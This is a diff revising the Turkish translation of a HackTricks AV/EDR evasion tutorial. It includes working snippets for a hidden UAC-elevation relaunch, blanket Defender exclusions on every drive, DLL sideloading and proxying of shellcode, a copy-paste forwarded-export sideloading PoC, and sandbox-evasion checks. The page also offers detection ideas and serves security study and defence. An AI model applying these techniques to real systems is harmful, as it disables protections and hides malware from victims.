@@ -2,125 +2,125 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p)**tarafından yazılmıştır!**
+**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p) **tarafından yazılmıştır!**
 
-## Stop Defender
+## Defender'ı Durdurma
 
-- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ı çalışamaz hale getiren bir araç.
-- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV taklidi yaparak Windows Defender'ı çalışamaz hale getiren bir araç.
-- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)
+- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durdurmaya yarayan bir tool.
+- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durdurmaya yarayan bir tool.
+- [Admin iseniz Defender'ı devre dışı bırakın](basic-powershell-for-pentesters/README.md)
 
-### Defender ile oynamadan önce installer-style UAC bait
+### Defender'a müdahale etmeden önce Installer tarzı UAC yemi
 
-Game cheats gibi davranan public loader'lar sık sık imzasız Node.js/Nexe installer'lar olarak gelir; bunlar önce **kullanıcıdan elevation ister** ve ancak ondan sonra Defender'ı etkisiz hale getirir. Akış basittir:
+Game cheat kılığına giren public loader'lar genellikle ilk olarak **kullanıcıdan elevation ister**, ardından Defender'ı etkisizleştiren imzasız Node.js/Nexe installer'lar olarak dağıtılır. Akış basittir:
 
-1. `net session` ile administrative context olup olmadığını kontrol et. Bu komut yalnızca çağıran admin rights sahibi olduğunda başarılı olur, bu yüzden bir failure loader'ın standard user olarak çalıştığını gösterir.
-2. Beklenen UAC consent prompt'unu tetiklemek için kendini hemen `RunAs` verb'i ile yeniden başlat ve orijinal command line'ı koru.
+1. `net session` ile administrative context'i kontrol edin. Komut yalnızca çağıran kişi admin haklarına sahip olduğunda başarıyla çalışır; dolayısıyla başarısız olması, loader'ın standard user olarak çalıştığını gösterir.
+2. Orijinal command line'ı korurken beklenen UAC consent prompt'unu tetiklemek için kendisini hemen `RunAs` verb'üyle yeniden başlatır.
 ```powershell
 if (-not (net session 2>$null)) {
 powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
 exit
 }
 ```
-Kurbanlar zaten “cracked” software kurduklarına inandıkları için, bu istem genellikle kabul edilir ve malware’e Defender’ın policy’sini değiştirmek için ihtiyaç duyduğu yetkileri verir.
+Kurbanlar zaten “cracked” yazılım yüklediklerine inandıkları için istem genellikle kabul edilir ve bu da malware’in Defender politikasını değiştirmek için ihtiyaç duyduğu yetkilere sahip olmasını sağlar.
 
 ### Her sürücü harfi için kapsamlı `MpPreference` exclusions
 
-Yükseltildikten sonra, GachiLoader tarzı zincirler Defender’ı tamamen kapatmak yerine blind spot’larını en üst düzeye çıkarır. Loader önce GUI watchdog’u (`taskkill /F /IM SecHealthUI.exe`) öldürür ve ardından **son derece geniş exclusions** uygular, böylece her user profile, system directory ve removable disk taranamaz hale gelir:
+Yetki yükseltildikten sonra GachiLoader tarzı zincirler, servisi tamamen devre dışı bırakmak yerine Defender’ın kör noktalarını en üst düzeye çıkarır. Loader önce GUI watchdog’u (`taskkill /F /IM SecHealthUI.exe`) sonlandırır, ardından **son derece geniş exclusions** ekleyerek her kullanıcı profilinin, sistem dizininin ve çıkarılabilir diskin taranamaz hale gelmesini sağlar:
 ```powershell
 $targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
 Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
 $targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
 Add-MpPreference -ExclusionExtension '.sys'
 ```
-Ana gözlemler:
+Önemli gözlemler:
 
-- Döngü bağlı olan her dosya sistemini gezer (D:\, E:\, USB bellekler vb.) bu yüzden **diskin herhangi bir yerine bırakılan gelecekteki herhangi bir payload göz ardı edilir**.
-- `.sys` uzantı hariç tutması ileriye dönüktür—saldırganlar daha sonra Defender’a tekrar dokunmadan imzasız driver yükleme seçeneğini saklı tutar.
-- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altına yazılır; böylece sonraki aşamalar dışlamaların kalıcı olduğunu doğrulayabilir veya UAC’yi yeniden tetiklemeden onları genişletebilir.
+- Döngü, bağlı tüm dosya sistemlerini (D:\, E:\, USB bellekler vb.) tarar; bu nedenle diskin herhangi bir yerine bırakılacak gelecekteki **payload**'lar yok sayılır.
+- `.sys` uzantısı hariç tutması ileriye dönük bir önlemdir; attackers, Defender'a tekrar dokunmadan daha sonra unsigned driver'lar yükleme seçeneğini saklı tutar.
+- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altında yapılır; böylece sonraki aşamalar, UAC'yi yeniden tetiklemeden exclusions'ların kalıcı olduğunu doğrulayabilir veya bunları genişletebilir.
 
-Hiçbir Defender servisi durdurulmadığı için, basit health check’ler gerçek zamanlı inceleme bu yolları hiç dokunmasa bile “antivirus active” raporlamaya devam eder.
+Hiçbir Defender service durdurulmadığından, basit health check'ler gerçek zamanlı inceleme bu paths'lere hiç uygulanmasa bile “antivirus active” bildirmeye devam eder.
 
 ## **AV Evasion Methodology**
 
-Günümüzde AV’ler bir dosyanın zararlı olup olmadığını kontrol etmek için farklı yöntemler kullanır: static detection, dynamic analysis ve daha gelişmiş EDR’ler için behavioural analysis.
+Günümüzde AV'ler bir dosyanın malicious olup olmadığını kontrol etmek için farklı yöntemler kullanır: static detection, dynamic analysis ve daha gelişmiş EDR'ler için behavioural analysis.
 
 ### **Static detection**
 
-Static detection; bir binary veya script içinde bilinen kötü amaçlı string’leri ya da byte dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgi çıkararak (örn. file description, company name, digital signatures, icon, checksum vb.) gerçekleştirilir. Bu, bilinen public tools kullanmanın sizi daha kolay ele verebileceği anlamına gelir; çünkü büyük ihtimalle analiz edilmiş ve malicious olarak işaretlenmişlerdir. Bu tür detection’dan kaçınmanın birkaç yolu vardır:
+Static detection, bir binary veya script içindeki bilinen malicious string'leri ya da byte dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgiler çıkararak (ör. file description, company name, digital signatures, icon, checksum vb.) gerçekleştirilir. Bu, bilinen public tools kullanmanın daha kolay yakalanmanıza neden olabileceği anlamına gelir; çünkü bu araçlar muhtemelen analiz edilmiş ve malicious olarak işaretlenmiştir. Bu tür detection yöntemlerini aşmanın birkaç yolu vardır:
 
 - **Encryption**
 
-Binary’yi encrypt ederseniz, AV’nin programınızı tespit etmesinin bir yolu kalmaz; ancak programı memory içinde decrypt edip çalıştıracak bir loader’a ihtiyacınız olur.
+Binary'yi encrypt ederseniz AV'nin programınızı tespit etmesi mümkün olmaz; ancak programı decrypt edip memory'de çalıştırmak için bir tür loader'a ihtiyacınız olacaktır.
 
 - **Obfuscation**
 
-Bazen AV’yi aşmak için tek yapmanız gereken binary veya script içindeki bazı string’leri değiştirmektir; ancak neyi obfuscate etmeye çalıştığınıza bağlı olarak bu zaman alıcı olabilir.
+Bazen binary veya script'inizdeki bazı string'leri değiştirmeniz, AV'yi aşmanız için yeterlidir; ancak neyi obfuscate etmeye çalıştığınıza bağlı olarak bu zaman alıcı bir iş olabilir.
 
 - **Custom tooling**
 
-Kendi araçlarınızı geliştirirseniz, bilinen kötü signature’lar olmaz; fakat bu çok fazla zaman ve emek ister.
+Kendi tools'larınızı geliştirirseniz bilinen bad signature'lar bulunmaz; ancak bu çok fazla zaman ve çaba gerektirir.
 
 > [!TIP]
-> Windows Defender static detection’a karşı kontrol yapmak için iyi bir yöntem [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)’tir. Temelde dosyayı birden fazla segmente böler ve ardından Defender’a her birini ayrı ayrı taratır; bu sayede binary’nizde tam olarak hangi string’lerin veya byte’ların işaretlendiğini söyleyebilir.
+> Windows Defender static detection'a karşı kontrol yapmak için [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanabilirsiniz. Bu araç temel olarak dosyayı birden fazla segmente böler ve ardından Defender'dan her birini ayrı ayrı scan etmesini ister; bu şekilde binary'nizde hangi string veya byte'ların işaretlendiğini tam olarak görebilirsiniz.
 
-Pratik AV Evasion hakkında bu [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)’i incelemenizi şiddetle öneririm.
+Pratik AV Evasion hakkında bu [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)'ine göz atmanızı şiddetle tavsiye ederim.
 
 ### **Dynamic analysis**
 
-Dynamic analysis, AV’nin binary’nizi bir sandbox içinde çalıştırıp malicious activity aramasıdır (örn. browser passwords’unuzu decrypt edip okumaya çalışmak, LSASS üzerinde minidump almak vb.). Bu kısım biraz daha zor olabilir; ancak sandbox’ları atlatmak için yapabileceğiniz bazı şeyler vardır.
+Dynamic analysis, AV'nin binary'nizi bir sandbox içinde çalıştırması ve malicious activity'yi izlemesidir (ör. browser password'larınızı decrypt edip okumaya çalışma, LSASS üzerinde minidump gerçekleştirme vb.). Bu kısımla çalışmak biraz daha zor olabilir; ancak sandbox'ları evade etmek için yapabileceğiniz bazı şeyler şunlardır.
 
-- **Sleep before execution** Nasıl implement edildiğine bağlı olarak, AV’nin dynamic analysis’ini bypass etmek için harika bir yol olabilir. AV’lerin kullanıcı iş akışını kesmemek için dosyaları taramak adına çok kısa bir süreleri vardır; bu yüzden uzun sleep süreleri binary’lerin analizini bozabilir. Sorun şu ki, birçok AV sandbox’ı uygulamaya bağlı olarak sleep’i atlayabilir.
-- **Checking machine's resources** Genellikle sandbox’ların kullanabileceği çok az kaynak vardır (örn. < 2GB RAM); aksi halde kullanıcının makinesini yavaşlatabilirler. Burada da oldukça yaratıcı olabilirsiniz; örneğin CPU sıcaklığını veya fan hızlarını kontrol etmek gibi, çünkü her şey sandbox içinde uygulanmış olmayacaktır.
-- **Machine-specific checks** Eğer workstation’ı "contoso.local" domain’ine join edilmiş bir kullanıcıyı hedefliyorsanız, bilgisayarın domain’ini kontrol edip belirlediğiniz değerle eşleşip eşleşmediğine bakabilirsiniz; eşleşmiyorsa programınızın çıkmasını sağlayabilirsiniz.
+- **Sleep before execution** Nasıl implement edildiğine bağlı olarak bu, AV'nin dynamic analysis'ini bypass etmek için harika bir yöntem olabilir. AV'lerin, kullanıcının workflow'unu kesintiye uğratmamak için dosyaları scan etmek üzere çok kısa bir süresi vardır; bu nedenle uzun sleep'ler binary'lerin analysis sürecini bozabilir. Sorun şu ki birçok AV sandbox'ı, nasıl implement edildiğine bağlı olarak sleep'i atlayabilir.
+- **Checking machine's resources** Sandbox'ların genellikle kullanabilecekleri kaynaklar çok azdır (ör. < 2GB RAM); aksi takdirde kullanıcının machine'ini yavaşlatabilirler. Burada oldukça creative de olabilirsiniz; örneğin CPU'nun sıcaklığını veya fan speed'lerini kontrol edebilirsiniz, çünkü sandbox'ta her şey implement edilmiş olmayacaktır.
+- **Machine-specific checks** “contoso.local” domain'ine katılmış bir workstation'ı hedeflemek istiyorsanız, computer'ın domain'ini kontrol ederek belirttiğiniz domain ile eşleşip eşleşmediğine bakabilirsiniz; eşleşmiyorsa programınızdan çıkmasını sağlayabilirsiniz.
 
-Meğer Microsoft Defender Sandbox bilgisayar adı HAL9TH imiş; yani detonasyon öncesi malware’inizde bilgisayar adını kontrol edebilirsiniz. Ad HAL9TH ile eşleşiyorsa bunun Defender sandbox içinde olduğunuz anlamına gelir; bu durumda programınızın çıkmasını sağlayabilirsiniz.
+Microsoft Defender's Sandbox computername'inin HAL9TH olduğu ortaya çıktı; bu nedenle detonation'dan önce malware'inizde computer name'i kontrol edebilirsiniz. İsim HAL9TH ile eşleşiyorsa Defender's sandbox'ının içinde olduğunuz anlamına gelir; bu durumda programınızdan çıkmasını sağlayabilirsiniz.
 
 <figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
-[@mgeeky](https://twitter.com/mariuszbit)’den Sandbox’lara karşı kullanabileceğiniz bazı başka çok iyi ipuçları
+Sandboxes'a karşı kullanılabilecek [@mgeeky](https://twitter.com/mariuszbit)'den bazı diğer çok iyi ipuçları
 
 <figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>
 
-Bu yazıda daha önce söylediğimiz gibi, **public tools** sonunda **detect edilecektir**, bu yüzden kendinize şu soruyu sormalısınız:
+Bu post'ta daha önce söylediğimiz gibi, **public tools** er ya da geç **detected** olacaktır; bu nedenle kendinize şu soruyu sormalısınız:
 
-Örneğin LSASS dump etmek istiyorsanız, **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa LSASS dump eden, daha az bilinen başka bir proje kullanabilir misiniz?
+Örneğin LSASS dump etmek istiyorsanız, **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa daha az bilinen ve LSASS'ı dump eden farklı bir project kullanabilir misiniz?
 
-Doğru cevap büyük olasılıkla ikincisidir. mimikatz’i örnek alırsak, muhtemelen AV’ler ve EDR’ler tarafından en çok işaretlenen malware parçalarından biridir; proje kendisi çok havalı olsa da, AV’leri aşmak için onunla çalışmak tam bir kabustur. Bu yüzden ulaşmak istediğiniz şey için alternatifler arayın.
+Doğru cevap muhtemelen ikincisidir. mimikatz'ı örnek olarak ele alırsak, muhtemelen AV'ler ve EDR'ler tarafından en çok flag'lenen malware'lerden biridir; project'in kendisi oldukça etkileyici olsa da AV'leri aşmak için onunla çalışmak bir nightmare'dir. Bu nedenle gerçekleştirmeye çalıştığınız işlem için alternatives arayın.
 
 > [!TIP]
-> Evasion için payload’larınızı değiştirirken defender içinde **automatic sample submission** özelliğini kapattığınızdan emin olun ve lütfen, ciddi anlamda, uzun vadede evasion hedefliyorsanız **VIRUSTOTAL’A YÜKLEMEYİN**. Payload’ınızın belirli bir AV tarafından detect edilip edilmediğini kontrol etmek istiyorsanız, onu bir VM’ye kurun, automatic sample submission’ı kapatmaya çalışın ve sonuçtan memnun kalana kadar orada test edin.
+> Payload'larınızı evasion için modifiye ederken Defender'da **automatic sample submission'ı kapattığınızdan** emin olun ve lütfen, uzun vadede evasion elde etmek istiyorsanız **VIRUSTOTAL'A UPLOAD ETMEYİN**. Payload'ınızın belirli bir AV tarafından detected olup olmadığını kontrol etmek istiyorsanız AV'yi bir VM'ye kurun, automatic sample submission'ı kapatmayı deneyin ve sonuçtan memnun kalana kadar testlerinizi orada gerçekleştirin.
 
 ## EXEs vs DLLs
 
-Mümkün olduğunda her zaman **evasion için DLLs kullanmayı önceliklendirin**; benim deneyimime göre DLL dosyaları genellikle **çok daha az detect edilir** ve analiz edilir. Bu nedenle bazı durumlarda detection’dan kaçınmak için çok basit bir hiledir (tabii payload’ınızın DLL olarak çalıştırılmasının bir yolu varsa).
+Mümkün olduğunda evasion için her zaman **DLL kullanmaya öncelik verin**; benim deneyimime göre DLL files genellikle **çok daha az detected** olur ve analiz edilir. Bu nedenle, bazı durumlarda detection'dan kaçınmak için kullanabileceğiniz çok basit bir trick'tir (elbette payload'ınızın DLL olarak çalıştırılabilmesi gerekir).
 
-Bu görselde de görebileceğimiz gibi, Havoc’tan bir DLL Payload antiscan.me üzerinde 4/26 detection rate’e sahipken, EXE payload 7/26 detection rate’e sahiptir.
+Bu image'da görebileceğimiz gibi, Havoc'tan bir DLL Payload'ın antiscan.me üzerindeki detection rate'i 4/26 iken EXE payload'ın detection rate'i 7/26'dır.
 
-<figure><img src="../images/image (1130).png" alt=""><figcaption><p>normal bir Havoc EXE payload ile normal bir Havoc DLL’in antiscan.me karşılaştırması</p></figcaption></figure>
+<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>
 
-Şimdi daha stealthy olmak için DLL dosyalarıyla kullanabileceğiniz bazı hileleri göstereceğiz.
+Şimdi DLL files ile kullanabileceğiniz ve çok daha stealthier olmanızı sağlayacak bazı trick'leri göstereceğiz.
 
 ## DLL Sideloading & Proxying
 
-**DLL Sideloading**, loader tarafından kullanılan DLL search order’dan faydalanır; victim application ile malicious payload(lar)ı yan yana konumlandırır.
+**DLL Sideloading**, hem victim application'ı hem de malicious payload(lar)ı yan yana konumlandırarak loader tarafından kullanılan DLL search order'dan yararlanır.
 
-[Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script’i kullanarak DLL Sideloading’e duyarlı programları kontrol edebilirsiniz:
+DLL Sideloading'e susceptible program'ları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'i kullanarak kontrol edebilirsiniz:
 ```bash
 Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
 $binarytoCheck = "C:\Program Files\" + $_
 C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
 }
 ```
-Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e duyarlı programların listesini ve yüklemeye çalıştıkları DLL dosyalarını çıktılar.
+Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e karşı savunmasız programların ve yüklemeyi denedikleri DLL dosyalarının listesini çıktılar.
 
-**DLL Hijackable/Sideloadable** programları kendiniz **explore** etmenizi şiddetle tavsiye ederim, bu teknik doğru yapıldığında oldukça stealthy’dir, ancak kamuya açık olarak bilinen DLL Sideloadable programları kullanırsanız, kolayca yakalanabilirsiniz.
+**DLL Hijackable/Sideloadable programs**'ları kendiniz **explore etmenizi** kesinlikle öneririm. Bu teknik doğru uygulandığında oldukça stealthy'dir; ancak publicly known DLL Sideloadable programs kullanırsanız kolayca yakalanabilirsiniz.
 
-Bir programın yüklemesini beklediği isimde kötü amaçlı bir DLL yerleştirmek, payload’unuzu yüklemez; çünkü program o DLL içinde bazı belirli fonksiyonları bekler. Bu sorunu düzeltmek için **DLL Proxying/Forwarding** adı verilen başka bir teknik kullanacağız.
+Bir programın yüklemeyi beklediği ada sahip malicious bir DLL yerleştirmek payload'unuzu çalıştırmaz; çünkü program bu DLL'in içinde belirli işlevlerin bulunmasını bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adı verilen başka bir teknik kullanacağız.
 
-**DLL Proxying**, bir programın proxy (ve kötü amaçlı) DLL üzerinden yaptığı çağrıları orijinal DLL’e yönlendirir; böylece programın işlevselliği korunur ve payload’unuzun çalıştırılmasını ele alabilirsiniz.
+**DLL Proxying**, bir programın proxy (ve malicious) DLL'e yaptığı çağrıları original DLL'e yönlendirir. Böylece programın işlevselliği korunur ve payload'unuzun çalıştırılmasını yönetebilirsiniz.
 
-[SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini [@flangvik](https://twitter.com/Flangvik/) kullanacağım.
+[@flangvik](https://twitter.com/Flangvik) tarafından geliştirilen [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.
 
 İzlediğim adımlar şunlardı:
 ```
@@ -129,48 +129,48 @@ Bir programın yüklemesini beklediği isimde kötü amaçlı bir DLL yerleştir
 3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
 4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
 ```
-Son komut bize 2 dosya verecek: bir DLL source code şablonu ve orijinal yeniden adlandırılmış DLL.
+Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış orijinal DLL.
 
 <figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
 ```
 5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
 ```
-These are the results:
+Bunlar sonuçlar:
 
 <figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>
 
-Hem bizim shellcode’umuz (SGN ile encode edilmiş: [SGN](https://github.com/EgeBalci/sgn)) hem de proxy DLL, [antiscan.me](https://antiscan.me) üzerinde 0/26 Detection rate aldı! Buna başarı derim.
+Hem [SGN](https://github.com/EgeBalci/sgn) ile encode edilmiş shellcode'umuzun hem de proxy DLL'in [antiscan.me](https://antiscan.me) üzerinde 0/26 Detection rate'i var! Buna başarı derdim.
 
 <figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>
 
 > [!TIP]
-> DLL Sideloading hakkında daha fazla bilgi edinmek için [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) ve ayrıca burada daha derinlemesine tartıştıklarımızı öğrenmek için [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) izlemenizi **şiddetle tavsiye ederim**.
+> DLL Sideloading hakkında [S3cur3Th1sSh1t's twitch VOD'unu](https://www.twitch.tv/videos/1644171543) ve ayrıca daha önce tartıştıklarımızı daha detaylı öğrenmek için [ippsec'in videosunu](https://www.youtube.com/watch?v=3eROsG_WNpE) izlemenizi **şiddetle tavsiye ederim**.
 
-### Forwarded Exports'ları Kötüye Kullanmak (ForwardSideLoading)
+### Forwarded Exports'ı Abusing Etme (ForwardSideLoading)
 
-Windows PE modülleri, aslında “forwarder” olan fonksiyonları export edebilir: code’a işaret etmek yerine, export girdisi `TargetDll.TargetFunc` biçiminde bir ASCII string içerir. Bir çağıran export’u resolve ettiğinde, Windows loader şunları yapar:
+Windows PE modülleri, aslında "forwarder" olan fonksiyonları export edebilir: export entry, code'a işaret etmek yerine `TargetDll.TargetFunc` biçiminde bir ASCII string içerir. Bir caller export'u resolve ettiğinde Windows loader:
 
-- Eğer yüklü değilse `TargetDll`’i yükler
-- `TargetFunc`’u ondan resolve eder
+- Henüz load edilmemişse `TargetDll`'yi load eder
+- `TargetFunc`'yi ondan resolve eder
 
 Anlaşılması gereken temel davranışlar:
-- Eğer `TargetDll` bir KnownDLL ise, protected KnownDLLs namespace’inden sağlanır (ör. ntdll, kernelbase, ole32).
-- Eğer `TargetDll` bir KnownDLL değilse, normal DLL search order kullanılır; buna forward resolution yapan module’ün directory’si de dahildir.
+- `TargetDll` bir KnownDLL ise, korumalı KnownDLLs namespace'inden (ör. ntdll, kernelbase, ole32) sağlanır.
+- `TargetDll` bir KnownDLL değilse normal DLL search order kullanılır; buna forward resolution gerçekleştiren modülün directory'si de dahildir.
 
-Bu, dolaylı bir sideloading primitive’i sağlar: Bir function’ı KnownDLL olmayan bir module adına forwarded edilen signed DLL bulun, ardından o signed DLL’yi, forwarded target module ile tam olarak aynı adla adlandırılmış attacker-controlled bir DLL ile aynı dizine koyun. Forwarded export çağrıldığında, loader forward’u resolve eder ve DLL’nizi aynı dizinden yükler, böylece DllMain’iniz çalışır.
+Bu, indirect bir sideloading primitive'i mümkün kılar: bir non-KnownDLL module name'e forward edilmiş bir function export eden signed DLL bulun ve bu signed DLL'yi, forwarded target module ile tam olarak aynı ada sahip attacker-controlled bir DLL ile aynı directory'ye yerleştirin. Forwarded export invoke edildiğinde loader forward'ı resolve eder ve DLL'inizi aynı directory'den load ederek DllMain'inizi execute eder.
 
-Windows 11’de gözlemlenen örnek:
+Windows 11'de gözlemlenen örnek:
 ```
 keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
 ```
-`NCRYPTPROV.dll` bir KnownDLL değildir, bu yüzden normal arama sırası üzerinden çözülür.
+`NCRYPTPROV.dll` bir KnownDLL değildir, bu nedenle normal arama sırasına göre çözümlenir.
 
-PoC (copy-paste):
-1) İmzalı sistem DLL’sini yazılabilir bir klasöre kopyalayın
+PoC (kopyala-yapıştır):
+1) İmzalı sistem DLL'sini yazılabilir bir klasöre kopyalayın
 ```
 copy C:\Windows\System32\keyiso.dll C:\test\
 ```
-2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Code execution elde etmek için minimal bir DllMain yeterlidir; DllMain’i tetiklemek için forwarded function’ı implement etmeniz gerekmez.
+2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Code execution elde etmek için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için forwarded function'ı uygulamanız gerekmez.
 ```c
 // x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
 #include <windows.h>
@@ -182,35 +182,35 @@ if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&
 return TRUE;
 }
 ```
-3) İmzalı bir LOLBin ile forward’ı tetikleyin:
+3) İletmeyi imzalı bir LOLBin ile tetikleyin:
 ```
 rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
 ```
 Gözlemlenen davranış:
-- rundll32 (signed) side-by-side `keyiso.dll` (signed) yükler
-- `KeyIsoSetAuditingInterface` çözülürken, loader yönlendirmeyi `NCRYPTPROV.SetAuditingInterface`'e takip eder
-- Loader ardından `NCRYPTPROV.dll` dosyasını `C:\test` içinden yükler ve onun `DllMain`'ini çalıştırır
-- Eğer `SetAuditingInterface` implement edilmemişse, "missing API" hatasını ancak `DllMain` zaten çalıştıktan sonra alırsınız
+- rundll32 (signed), side-by-side `keyiso.dll` (signed) dosyasını yükler
+- `KeyIsoSetAuditingInterface` çözümlenirken loader, `NCRYPTPROV.SetAuditingInterface` yönlendirmesini takip eder
+- Ardından loader, `C:\test` konumundaki `NCRYPTPROV.dll` dosyasını yükler ve `DllMain` işlevini çalıştırır
+- `SetAuditingInterface` uygulanmamışsa, "missing API" hatasını yalnızca `DllMain` zaten çalıştıktan sonra alırsınız
 
-Avlama ipuçları:
-- Hedef module bir KnownDLL değilken forward edilmiş exports üzerine odaklanın. KnownDLLs, `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
-- Forward edilmiş exports'ları şu tür tooling ile enumerate edebilirsiniz:
+Hunting ipuçları:
+- Hedef modülün KnownDLL olmadığı forwarded export'lara odaklanın. KnownDLL'ler `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
+- Forwarded export'ları aşağıdaki gibi araçlarla enumerate edebilirsiniz:
 ```
 dumpbin /exports C:\Windows\System32\keyiso.dll
 # forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
 ```
 - Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt
 
-Detection/defense fikirleri:
-- LOLBins’leri (örn. rundll32.exe) sistem dışı yollardan imzalı DLL’leri yüklerken, ardından aynı klasörden aynı temel ada sahip non-KnownDLLs’leri yüklerken izleyin
-- Şu tür process/module zincirleri için alert oluşturun: `rundll32.exe` → sistem dışı `keyiso.dll` → kullanıcı tarafından yazılabilir yollardaki `NCRYPTPROV.dll`
-- code integrity politikalarını (WDAC/AppLocker) zorlayın ve application dizinlerinde write+execute erişimini engelleyin
+Tespit/savunma fikirleri:
+- LOLBins'leri (ör. `rundll32.exe`) system dışı yollardan imzalı DLL'ler yüklerken ve ardından aynı temel ada sahip, `KnownDLLs` içinde bulunmayan DLL'leri bu dizinden yüklerken izleyin
+- Şu tür işlem/modül zincirleri için uyarı oluşturun: kullanıcı tarafından yazılabilir yollar altında `rundll32.exe` → system dışı `keyiso.dll` → `NCRYPTPROV.dll`
+- Code integrity policy'lerini (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde write+execute işlemlerini engelleyin
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
 
-`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`
+`Freeze, askıya alınmış process'ler, direct syscalls ve alternatif execution yöntemlerini kullanarak EDR'leri bypass etmeye yönelik bir payload toolkit'idir`
 
-Freeze’i shellcode’unuzu gizli bir şekilde yüklemek ve execute etmek için kullanabilirsiniz.
+Freeze'i shellcode'unuzu stealthy bir şekilde yüklemek ve execute etmek için kullanabilirsiniz.
 ```
 Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
 1. Generate some shellcode, in this case I used Havoc C2.
@@ -220,24 +220,24 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 <figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>
 
 > [!TIP]
-> Evasion sadece bir kedi & fare oyunudur; bugün çalışan bir şey yarın tespit edilebilir, bu yüzden asla tek bir araca güvenmeyin, mümkünse birden fazla evasion tekniğini zincirleme kullanmayı deneyin.
+> Evasion yalnızca bir kedi-fare oyunudur; bugün çalışan bir şey yarın detect edilebilir. Bu nedenle hiçbir zaman yalnızca tek bir araca güvenmeyin, mümkünse birden fazla evasion tekniğini zincirlemeyi deneyin.
 
-## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)
+## Direct/Indirect Syscalls ve SSN Resolution (SysWhispers4)
 
-EDR'ler sık sık `ntdll.dll` syscall stub'ları üzerinde **user-mode inline hooks** yerleştirir. Bu hook'ları aşmak için, doğru **SSN** (System Service Number) yükleyen ve hooked export entrypoint'i çalıştırmadan kernel mode'a geçen **direct** veya **indirect** syscall stub'ları üretebilirsiniz.
